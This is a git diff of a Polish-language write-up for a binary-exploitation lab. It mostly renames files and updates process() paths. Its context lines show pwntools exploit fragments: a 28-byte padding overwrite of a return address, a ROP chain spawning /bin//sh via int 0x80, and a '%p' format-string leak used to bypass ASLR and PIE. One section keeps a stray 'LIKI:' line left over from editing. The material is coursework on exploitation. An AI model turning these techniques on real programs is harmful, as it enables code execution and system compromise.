@@ -130,9 +130,12 @@ W przypadku każdego z popunktów padding jest identyczny i wynosi 28 znaków. J
 
 ### a) NO ASLR & NO PIE
 
+--------------
 PLIKI:
-* vuln-1
-* exploit-1
+1. `vuln.c`
+2. `vuln-1`
+3. `exploit-1.py`
+-------------
 
 Jako że ASLR oraz PIE jest wyłączone, adres funkcji `win` jest stały. Oznacza to, że adres mogę pobrać bezpośrednio z `gdb`. Wówczas exploit to podanie odpowiedniego paddingu oraz nadpisanie adresu powrotu adresem funkcji `win`.
 
@@ -147,7 +150,7 @@ Kod prostego exploitu znajduje się poniżej.
 
 from pwn import *
 
-p = process('./vuln')
+p = process('./vuln-1')
 
 send = b"A" * 28 + p32(0x08049192)
 p.sendline(b"")
@@ -167,9 +170,15 @@ W wyniku poniższego exploitu dostajemy shella.
 
 ### b) NO ASLR & PIE
 
+
+--------------
 PLIKI:
-* vuln-protected-2
-* exploit-protected-2.py
+1. `vuln.c`
+2. `vuln-2`
+3. `exploit-2.py`
+-------------
+
+
 
 W przypadku tego ustawienia, asm skompilowanej aplikacji oparty jest na liczeniu offsetów. Jednakże, base addres jest stały, gdyż nie używamy ASLR. 
 
@@ -207,9 +216,14 @@ W wyniku poniższego exploitu dostajemy shella.
 
 ### c) ASLR & NO PIE
 
+
+--------------
 PLIKI:
-* vuln-1
-* exploit-1.py
+1. `vuln.c`
+2. `vuln-1`
+3. `exploit-1.py`
+-------------
+
 
 W takiej konfiguracji atak opisany, tak jak w podpunkcie `a)` jest identyczny. Dzieje się tak, ponieważ sekcja `text` nie jest losowana. Jej adres jest stały. Wartość funkcji `win` można pobrać z `gdb` tak samo jak w podpunkcie `a)`. Exploit ten sam co w punkcie `a)`.
 
@@ -218,7 +232,14 @@ W takiej konfiguracji atak opisany, tak jak w podpunkcie `a)` jest identyczny. D
 
 ### d) ASLR & PIE
 
+--------------
 PLIKI:
+1. `vuln.c`
+2. `vuln-2`
+3. `exploit-3.py`
+-------------
+
+LIKI:
 * vuln-protected-2 
 * exploit-protected-3.py
 
@@ -317,9 +338,13 @@ Kod aplikacji jest ten sam co we wszytskich punktach. Wykorzystywanymi podantoś
 
 ### a) ASLR & NO PIE
 
+--------------
 PLIKI:
-* vuln-protected-3
-* exploit-protected-4.py
+1. `vuln.c`
+2. `vuln-3`
+3. `exploit-4.py`
+-------------
+
 
 W przypadku konfiguracji bez `PIE` odnalezienia adresów gadgetów jest trywialne. Sekcja text, w której znajduje się kod aplikacji jest stały. Gdgety który odnalazłem pozwalają mi umieścić argument `/bin//sh` w odpowiednie miejsce w pamięci, a także powalają mi ustawic wartości w rejestrach na takie, które są potrzeben do wykonania syscalla.
 
@@ -437,7 +462,7 @@ shellcode = b''.join([
     int80()
 ])
 
-p = process('./vuln-protected-3')
+p = process('./vuln-3')
 
 p.sendline(b"")
 p.sendline(shellcode)
@@ -462,9 +487,11 @@ W wyniku powyższego exlpoitu uzyskuję shella.
 
 ### b) ASLR & PIE
 
-PLIKI:
-* vuln-protected-4
-* exploit-protected-5.py
+-------------
+Pliki:
+1. `vuln.c`
+2. `vuln-4`
+3. `exploit-5.py`
 
 Exploitacja programu z `PIE` jest o tyle trudniejsza, ponieważ sekcja text jest równiez ruchoma. Aby odnaleźć offset, dzięki któremu wiem gdzie znajdują się wszytskie isntrukcji posłużyłem się identycznym sposobem co w punkcie `5.1 d)` - schemat jak to zrobiłem jest przedstawiony we wskazanym punkcie. 
 
@@ -556,7 +583,7 @@ def int80():
     return p32(offset + 0x00004862)
 
 
-p = process('./vuln-protected-4')
+p = process('./vuln-4')
 
 # retrive offset and buffor addres
 p.sendline("%p" * 7)
